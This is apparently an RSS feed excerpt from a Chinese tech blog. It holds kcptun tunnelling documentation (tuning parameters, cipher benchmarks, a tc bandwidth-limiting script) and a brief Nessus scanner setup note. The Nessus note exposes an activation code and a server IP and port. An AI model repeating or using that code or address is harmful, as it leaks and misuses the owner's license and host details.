   --autoexpire value            set auto expiration time(in seconds) for a single UDP connection, 0 to disable (default: 0)  
   --mtu value                   set maximum transmission unit for UDP packets (default: 1350)  
   --sndwnd value                set send window size(num of packets) (default: 128)  
   --rcvwnd value                set receive window size(num of packets) (default: 1024)  
   --datashard value             set reed-solomon erasure coding - datashard (default: 10)  
   --parityshard value           set reed-solomon erasure coding - parityshard (default: 3)  
   --dscp value                  set DSCP(6bit) (default: 0)  
   --nocomp                      disable compression  
   --log value                   specify a log file to output, default goes to stderr  
   -c value                      config from json file, which will override the command from shell  
   --help, -h                    show help  
   --version, -v                 print the version  

$ ./server_darwin_amd64 -h  
NAME:  
   kcptun - server(with SMUX)  

USAGE:  
   server_darwin_amd64 [global options] command [command options] [arguments...]  

VERSION:  
   20161025  

COMMANDS:  
     help, h  Shows a list of commands or help for one command  

GLOBAL OPTIONS:  
   --listen value, -l value  kcp server listen address (default: &amp;quot;:29900&amp;quot;)  
   --target value, -t value  target server address (default: &amp;quot;127.0.0.1:12948&amp;quot;)  
   --key value               pre-shared secret between client and server (default: &amp;quot;it&#39;s a secrect&amp;quot;) [$KCPTUN_KEY]  
   --crypt value             aes, aes-128, aes-192, salsa20, blowfish, twofish, cast5, 3des, tea, xtea, xor, none (default: &amp;quot;aes&amp;quot;)  
   --mode value              profiles: fast3, fast2, fast, normal (default: &amp;quot;fast&amp;quot;)  
   --mtu value               set maximum transmission unit for UDP packets (default: 1350)  
   --sndwnd value            set send window size(num of packets) (default: 1024)  
   --rcvwnd value            set receive window size(num of packets) (default: 1024)  
   --datashard value         set reed-solomon erasure coding - datashard (default: 10)  
   --parityshard value       set reed-solomon erasure coding - parityshard (default: 3)  
   --dscp value              set DSCP(6bit) (default: 0)  
   --nocomp                  disable compression  
   --log value               specify a log file to output, default goes to stderr  
   -c value                  config from json file, which will override the command from shell  
   --help, -h                show help  
   --version, -v             print the version  
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;分层参数图&#34;&gt;分层参数图&lt;/h4&gt;

&lt;p align=&#34;left&#34;&gt;&lt;img src=&#34;layeredparams.png&#34; alt=&#34;params&#34; height=&#34;450px&#34;/&gt;&lt;/p&gt;  

&lt;h3 id=&#34;内置模式&#34;&gt;内置模式&lt;/h3&gt;

&lt;p&gt;响应速度:&lt;br /&gt;
&lt;em&gt;fast3 &amp;gt; fast2 &amp;gt;&lt;/em&gt; &lt;strong&gt;[fast]&lt;/strong&gt; &lt;em&gt;&amp;gt; normal &amp;gt; default&lt;/em&gt;&lt;br /&gt;
有效载荷比:&lt;br /&gt;
&lt;em&gt;default &amp;gt; normal &amp;gt;&lt;/em&gt; &lt;strong&gt;[fast]&lt;/strong&gt; &lt;em&gt;&amp;gt; fast2 &amp;gt; fast3&lt;/em&gt;&lt;br /&gt;
中间mode参数比较均衡，总之就是越快，包重传越激进。&lt;br /&gt;
更高级的 &lt;strong&gt;手动档&lt;/strong&gt; 需要理解KCP协议，并通过 &lt;strong&gt;隐藏参数&lt;/strong&gt; 调整，例如:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; -mode manual -nodelay 1 -resend 2 -nc 1 -interval 20  
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;搭配1. fast + FEC(5,5)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;搭配2. fast2 + FEC(10,3)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;搭配3. fast2 + FEC(0,0)&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;默认profile参考: &lt;a href=&#34;https://github.com/xtaci/kcptun/blob/master/client/main.go#L248&#34; target=&#34;_blank&#34;&gt;https://github.com/xtaci/kcptun/blob/master/client/main.go#L248&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;前向纠错&#34;&gt;前向纠错&lt;/h3&gt;

&lt;p&gt;前向纠错采用Reed Solomon纠删码, 它的基本原理如下： 给定n个数据块d1, d2,…, dn，n和一个正整数m， RS根据n个数据块生成m个校验块， c1, c2,…, cm。 对于任意的n和m， 从n个原始数据块和m 个校验块中任取n块就能解码出原始数据， 即RS最多&lt;strong&gt;容忍m个数据块或者校验块同时丢失&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;rs.png&#34; alt=&#34;reed-solomon&#34; /&gt;&lt;/p&gt;

&lt;p&gt;通过参数&lt;code&gt;-datashard n -parityshard m&lt;/code&gt; 在两端同时设定。&lt;/p&gt;

&lt;p&gt;数据包发送顺序严格遵循: n个datashard紧接m个parityshard，重复。&lt;/p&gt;

&lt;p&gt;注意：为了发挥FEC最佳效果，设置 parityshard/(parity+datashard) &amp;gt; packet loss，比如5/(5+5) &amp;gt; 30%&lt;/p&gt;

&lt;h3 id=&#34;窗口调整&#34;&gt;窗口调整&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;两端参数必须一致的有&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;datashard &amp;ndash;前向纠错&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;parityshard &amp;ndash;前向纠错&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;nocomp &amp;ndash;压缩&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;key &amp;ndash;密钥&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;crypt &amp;ndash;加密算法&lt;br /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其余为两边可独立设定的参数&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;简易窗口自我调优方法&lt;/strong&gt;：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;第一步：同时在两端逐步增大client rcvwnd和server sndwnd;&lt;br /&gt;
第二步：尝试下载，观察如果带宽利用率（服务器＋客户端两端都要观察）接近物理带宽则停止，否则跳转到第一步。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;strong&gt;注意：产生大量重传时，一定是窗口偏大了&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&#34;安全&#34;&gt;安全&lt;/h3&gt;

&lt;p&gt;无论你上层如何加密，如果&lt;code&gt;-crypt none&lt;/code&gt;，那么&lt;strong&gt;协议头部&lt;/strong&gt;都是&lt;strong&gt;明文&lt;/strong&gt;的，建议至少采用&lt;code&gt;-crypt aes-128&lt;/code&gt;加密，并修改密码。&lt;/p&gt;

&lt;p&gt;密码可以通过&lt;code&gt;-key&lt;/code&gt;指定，也可以通过环境变量&lt;code&gt;KCPTUN_KEY&lt;/code&gt;指定。&lt;/p&gt;

&lt;p&gt;注意: &lt;code&gt;-crypt xor&lt;/code&gt; 也是不安全的，除非你知道你在做什么。&lt;/p&gt;

&lt;p&gt;附加密速度Benchmark：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;BenchmarkAES128-4      	  200000	     11182 ns/op  
BenchmarkAES192-4      	  200000	     12699 ns/op  
BenchmarkAES256-4      	  100000	     13757 ns/op  
BenchmarkTEA-4         	   50000	     26441 ns/op  
BenchmarkSimpleXOR-4   	 3000000	       441 ns/op  
BenchmarkBlowfish-4    	   30000	     48036 ns/op  
BenchmarkNone-4        	20000000	       106 ns/op  
BenchmarkCast5-4       	   20000	     60222 ns/op  
BenchmarkTripleDES-4   	    2000	    878759 ns/op  
BenchmarkTwofish-4     	   20000	     68501 ns/op  
BenchmarkXTEA-4        	   20000	     77417 ns/op  
BenchmarkSalsa20-4     	  300000	      4998 ns/op  
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;内存控制&#34;&gt;内存控制&lt;/h3&gt;

&lt;p&gt;路由器，手机等嵌入式设备通常对&lt;strong&gt;内存用量敏感&lt;/strong&gt;，通过调节环境变量GOGC（例如GOGC=20)后启动client，可以降低内存使用。&lt;br /&gt;
参考：&lt;a href=&#34;https://blog.golang.org/go15gc&#34; target=&#34;_blank&#34;&gt;https://blog.golang.org/go15gc&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&#34;dscp&#34;&gt;DSCP&lt;/h3&gt;

&lt;p&gt;DSCP差分服务代码点（Differentiated Services Code Point），IETF于1998年12月发布了Diff-Serv（Differentiated Service）的QoS分类标准。它在每个数据包IP头部的服务类别TOS标识字节中，利用已使用的&lt;strong&gt;6比特&lt;/strong&gt;和未使用的2比特，通过编码值来区分优先级。&lt;br /&gt;
常用DSCP值可以参考&lt;a href=&#34;https://en.wikipedia.org/wiki/Differentiated_services#Commonly_used_DSCP_values&#34; target=&#34;_blank&#34;&gt;Wikipedia DSCP&lt;/a&gt;，至于有没有用，完全取决于数据包经过的设备。&lt;/p&gt;

&lt;p&gt;通过 &lt;code&gt;-dscp&lt;/code&gt; 参数指定dscp值，两端可分别设定。&lt;/p&gt;

&lt;p&gt;注意：设置dscp不一定会更好，需要尝试。&lt;/p&gt;

&lt;h3 id=&#34;snappy数据流压缩&#34;&gt;Snappy数据流压缩&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Snappy is a compression/decompression library. It does not aim for maximum&lt;br /&gt;
compression, or compatibility with any other compression library; instead,&lt;br /&gt;
it aims for very high speeds and reasonable compression. For instance,&lt;br /&gt;
compared to the fastest mode of zlib, Snappy is an order of magnitude faster&lt;br /&gt;
for most inputs, but the resulting compressed files are anywhere from 20% to&lt;br /&gt;
100% bigger.&lt;/p&gt;

&lt;p&gt;Reference: &lt;a href=&#34;http://google.github.io/snappy/&#34; target=&#34;_blank&#34;&gt;http://google.github.io/snappy/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;通过参数 &lt;code&gt;-nocomp&lt;/code&gt; 在两端同时设定以关闭压缩。&lt;br /&gt;
&amp;gt; 提示: 关闭压缩可能会降低延迟。&lt;/p&gt;

&lt;h3 id=&#34;流量控制&#34;&gt;流量控制&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;必要性: 针对流量敏感的服务器，做双保险。&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;基本原则: SERVER的发送速率不能超过ADSL下行带宽，否则只会浪费您的服务器带宽。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;在server通过linux tc，可以限制服务器发送带宽。&lt;br /&gt;
举例:  用linux tc限制server发送带宽为32mbit/s:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kcptun:~# cat tc.sh  
tc qdisc del dev eth0 root  
tc qdisc add dev eth0 root handle 1: htb  
tc class add dev eth0 parent 1: classid 1:1 htb rate 32mbit  
tc filter add dev eth0 protocol ip parent 1:0 prio 1 handle 10 fw flowid 1:1  
iptables -t mangle -A POSTROUTING -o eth0  -j MARK --set-mark 10  
root@kcptun:~#  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中eth0为网卡，有些服务器为ens3，有些为p2p1，通过ifconfig查询修改。&lt;/p&gt;

&lt;h3 id=&#34;snmp&#34;&gt;SNMP&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Snmp defines network statistics indicator  
type Snmp struct {  
	BytesSent        uint64 // payload bytes sent  
	BytesReceived    uint64  
	MaxConn          uint64  
	ActiveOpens      uint64  
	PassiveOpens     uint64  
	CurrEstab        uint64  
	InErrs           uint64  
	InCsumErrors     uint64 // checksum errors  
	InSegs           uint64  
	OutSegs          uint64  
	OutBytes         uint64 // udp bytes sent  
	RetransSegs      uint64  
	FastRetransSegs  uint64  
	EarlyRetransSegs uint64  
	LostSegs         uint64  
	RepeatSegs       uint64  
	FECRecovered     uint64  
	FECErrs          uint64  
	FECSegs          uint64 // fec segments received  
}  
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;使用&lt;code&gt;kill -SIGUSR1 pid&lt;/code&gt; 可以在控制台打印出SNMP信息，通常用于精细调整&lt;strong&gt;当前链路的有效载荷比&lt;/strong&gt;。&lt;br /&gt;
观察&lt;code&gt;RetransSegs,FastRetransSegs,LostSegs,OutSegs&lt;/code&gt;这几者的数值比例，用于参考调整&lt;code&gt;-mode manual,fec&lt;/code&gt;的参数。&lt;/p&gt;

&lt;h4 id=&#34;带宽计算公式&#34;&gt;带宽计算公式&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;在不丢包的情况下，有最大-rcvwnd 个数据包在网络上正在向你传输，以平均数据包大小avgsize计算，在任意时刻，有：  

		network_cap = rcvwnd*avgsize  

数据流向你，这个值再除以ping值(rtt)，等于最大带宽使用量。  

		max_bandwidth = network_cap/rtt = rcvwnd*avgsize/rtt  

举例，设rcvwnd = 1024, avgsize = 1KB, rtt = 400ms，则：  

		max_bandwidth = 1024 * 1KB / 400ms = 2.5MB/s ~= 25Mbps  

（注：以上计算不包括前向纠错的数据量）  

前向纠错是最大带宽量的一个固定比例增加：  

		max_bandwidth_fec = max_bandwidth*(datashard+parityshard)/datashard  

举例，设datashard = 10 , partiyshard = 3，则：  

		max_bandwidth_fec = max_bandwidth * (10 + 3) /10 = 1.3*max_bandwidth ＝ 1.3 * 25Mbps = 32.5Mbps  
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;故障排除&#34;&gt;故障排除&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;Q: 客户端和服务器端&lt;strong&gt;皆无&lt;/strong&gt; &lt;code&gt;stream opened&lt;/code&gt;信息。&lt;br /&gt;
A: 连接客户端程序的端口设置错误。&lt;/p&gt;

&lt;p&gt;Q: 客户端有 &lt;code&gt;stream opened&lt;/code&gt;信息，服务器端没有。&lt;br /&gt;
A: 连接服务器的端口设置错误，或者被防火墙拦截。&lt;/p&gt;

&lt;p&gt;Q: 客户端服务器&lt;strong&gt;皆有&lt;/strong&gt; &lt;code&gt;stream opened&lt;/code&gt;信息，但无法通信。&lt;br /&gt;
A: 上层软件的设定错误。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;免责申明&#34;&gt;免责申明&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;用户以各种方式使用本软件（包括但不限于修改使用、直接使用、通过第三方使用）的过程中，不得以任何方式利用本软件直接或间接从事违反中国法律、以及社会公德的行为。软件的使用者需对自身行为负责，因使用软件引发的一切纠纷，由使用者承担全部法律及连带责任。作者不承担任何法律及连带责任。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;对免责声明的解释、修改及更新权均属于作者本人所有。&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&#34;捐赠&#34;&gt;捐赠&lt;/h3&gt;

&lt;p&gt;&lt;img src=&#34;donate.png&#34; alt=&#34;donate&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;特别鸣谢&#34;&gt;特别鸣谢&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;郑H立, 南东风, Li, 七七, 凌君, 昶，LesMiserables, KyOn, 噼里啪啦, 继斌, 小苍辛苦, &lt;strong&gt;Ken&lt;/strong&gt;,&lt;br /&gt;
乔槁, 佳晨, 猪肉佬, lcx, 昊文, 冰峰, 凡, alex, &lt;strong&gt;海豹叔叔&lt;/strong&gt;, 奥姐, 张冰, 司成,&lt;br /&gt;
武子, &lt;strong&gt;慎&lt;/strong&gt;，Alex43211，&lt;strong&gt;Coxxs&lt;/strong&gt;，荣，NeroNg，吴骁，定一，我不是林J&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;好人一生平安!&lt;/p&gt;

&lt;h3 id=&#34;相关软件&#34;&gt;相关软件&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/bettermanbao/openwrt-kcptun&#34; target=&#34;_blank&#34;&gt;https://github.com/bettermanbao/openwrt-kcptun&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/EasyPi/openwrt-kcptun&#34; target=&#34;_blank&#34;&gt;https://github.com/EasyPi/openwrt-kcptun&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/kuoruan/luci-app-kcptun&#34; target=&#34;_blank&#34;&gt;https://github.com/kuoruan/luci-app-kcptun&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/dfdragon/kcptun_gclient&#34; target=&#34;_blank&#34;&gt;https://github.com/dfdragon/kcptun_gclient&lt;/a&gt;&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;参考资料&#34;&gt;参考资料&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/skywind3000/kcp&#34; target=&#34;_blank&#34;&gt;https://github.com/skywind3000/kcp&lt;/a&gt; &amp;ndash; KCP - A Fast and Reliable ARQ Protocol.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/klauspost/reedsolomon&#34; target=&#34;_blank&#34;&gt;https://github.com/klauspost/reedsolomon&lt;/a&gt; &amp;ndash; Reed-Solomon Erasure Coding in Go.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Differentiated_services&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/Differentiated_services&lt;/a&gt; &amp;ndash; DSCP.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://google.github.io/snappy/&#34; target=&#34;_blank&#34;&gt;http://google.github.io/snappy/&lt;/a&gt; &amp;ndash; A fast compressor/decompressor.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.backblaze.com/blog/reed-solomon/&#34; target=&#34;_blank&#34;&gt;https://www.backblaze.com/blog/reed-solomon/&lt;/a&gt; &amp;ndash; Reed-Solomon Explained.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.qualcomm.cn/products/raptorq&#34; target=&#34;_blank&#34;&gt;http://www.qualcomm.cn/products/raptorq&lt;/a&gt; &amp;ndash; RaptorQ Forward Error Correction Scheme for Object Delivery.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/PBKDF2&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/PBKDF2&lt;/a&gt; &amp;ndash; Key stretching.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://blog.appcanary.com/2016/encrypt-or-compress.html&#34; target=&#34;_blank&#34;&gt;http://blog.appcanary.com/2016/encrypt-or-compress.html&lt;/a&gt; &amp;ndash; Should you encrypt or compress first?&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hashicorp/yamux&#34; target=&#34;_blank&#34;&gt;https://github.com/hashicorp/yamux&lt;/a&gt; &amp;ndash; Connection multiplexing library.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc6937&#34; target=&#34;_blank&#34;&gt;https://tools.ietf.org/html/rfc6937&lt;/a&gt; &amp;ndash; Proportional Rate Reduction for TCP.&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://tools.ietf.org/html/rfc5827&#34; target=&#34;_blank&#34;&gt;https://tools.ietf.org/html/rfc5827&lt;/a&gt; &amp;ndash; Early Retransmit for TCP and Stream Control Transmission Protocol (SCTP).&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://http2.github.io/&#34; target=&#34;_blank&#34;&gt;http://http2.github.io/&lt;/a&gt; &amp;ndash; What is HTTP/2?&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.lartc.org/LARTC-zh_CN.GB2312.pdf&#34; target=&#34;_blank&#34;&gt;http://www.lartc.org/LARTC-zh_CN.GB2312.pdf&lt;/a&gt; &amp;ndash; Linux Advanced Routing &amp;amp; Traffic Control&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Noisy-channel_coding_theorem&#34; target=&#34;_blank&#34;&gt;https://en.wikipedia.org/wiki/Noisy-channel_coding_theorem&lt;/a&gt; &amp;ndash; Noisy channel coding theorem&lt;br /&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        
        <item>
            <title>Nessus</title>
            <link>http://blog.pytool.com/hacker/2017-09-06-nessus/</link>
            <pubDate>Tue, 29 Mar 2016 21:25:45 CST</pubDate>
            <author>rinetd</author>
            <guid>http://blog.pytool.com/hacker/2017-09-06-nessus/</guid>
            <description>&lt;ol&gt;
&lt;li&gt;&lt;p&gt;注册&lt;br /&gt;
&lt;a href=&#34;http://www.tenable.com/products/nessus-home&#34; target=&#34;_blank&#34;&gt;http://www.tenable.com/products/nessus-home&lt;/a&gt;&lt;br /&gt;
Your activation code for the Nessus Home is&lt;br /&gt;
E793-A801-D230-1175-7DCD&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;安装启动&lt;br /&gt;
systemctl start nessusd.service&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://118.190.98.144:8834&#34; target=&#34;_blank&#34;&gt;https://118.190.98.144:8834&lt;/a&gt;&lt;br /&gt;
rinetd sdl&amp;hellip;&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        
    </channel>
</rss>
